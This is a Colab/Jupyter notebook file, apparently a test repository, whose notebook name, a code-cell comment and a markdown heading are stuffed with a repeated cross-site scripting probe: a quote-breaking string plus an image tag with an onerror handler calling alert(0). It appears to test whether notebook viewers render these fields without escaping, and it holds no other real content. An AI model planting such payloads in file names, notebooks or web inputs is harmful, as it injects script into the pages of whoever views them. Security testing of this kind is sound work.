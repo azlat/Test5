{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Unt>'>\"><img src=x onerror=alert(0)>itled6.ipynb",
      "version": "0.3.2",
      "provenance": [],
      "collapsed_sections": [],
      "toc_visible": true,
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/azlat/Test5/blob/master/TEEEEEEEEEEEEEEEST.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "JLIdmyfSZQ2F",
        "colab_type": "code",
        "cellView": "code",
        "colab": {}
      },
      "source": [
        "#@m>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>>'>\"><img src=x onerror=alert(0)>ar>'>\"><img src=x onerror=alert(0)>kdown te>'>\"><img src=x onerror=alert(0)>st markdown\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "uwbJ4emMZ7XI",
        "colab_type": "text"
      },
      "source": [
        ">'>\"><img src=x onerror=alert(0)># New Se>'>\"><img src=x onerror=alert(0)>ction"
      ]
    }
  ]
}